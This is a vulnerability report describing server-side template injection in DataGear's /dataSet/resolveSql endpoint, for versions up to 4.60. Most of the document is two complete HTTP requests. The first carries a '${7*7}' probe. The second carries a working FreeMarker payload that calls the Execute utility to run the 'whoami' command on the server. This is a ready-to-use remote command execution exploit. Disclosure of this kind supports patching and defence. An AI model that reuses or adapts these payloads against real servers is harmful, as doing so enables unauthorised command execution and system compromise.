# Vulnerability description

datagear exists a freemaker template injected in the /dataSet/resolveSql route rendering sql statement

# Affects Version

Datagear <=4.60

# Vulnerability certificate

```
POST /dataSet/resolveSql HTTP/1.1
Host: 127.0.0.1:50401
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_ID_ANONYMOUS=97269975b0004387b7443950946b97a8; DETECTED_VERSION=5.1.0; MAIN_MENU_COLLAPSE=false; DETECT_NEW_VERSION_RESOLVED=true; JSESSIONID=558AD79A275792C7E90DB8962991CC43
Connection: keep-alive
Accept-Encoding: gzip, deflateAccept: */*Connection: keep-alive
Content-Type: application/json
Content-Length: 17

{"sql": "${7*7}"}
```

![image.png](https://gitee.com/nn0nkey/picture/raw/master/img/20241112221757.png)

You can also execute arbitrary commands

```
POST /dataSet/resolveSql HTTP/1.1
Host: 127.0.0.1:50401
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_ID_ANONYMOUS=97269975b0004387b7443950946b97a8; DETECTED_VERSION=5.1.0; MAIN_MENU_COLLAPSE=false; DETECT_NEW_VERSION_RESOLVED=true; JSESSIONID=558AD79A275792C7E90DB8962991CC43
Connection: keep-alive
Accept-Encoding: gzip, deflateAccept: */*Connection: keep-alive
Content-Type: application/json
Content-Length: 88

{"sql": "<#assign value='freemarker.template.utility.Execute'?new()>${value('whoami')}"}
```

![image.png](https://gitee.com/nn0nkey/picture/raw/master/img/20241112221943.png)
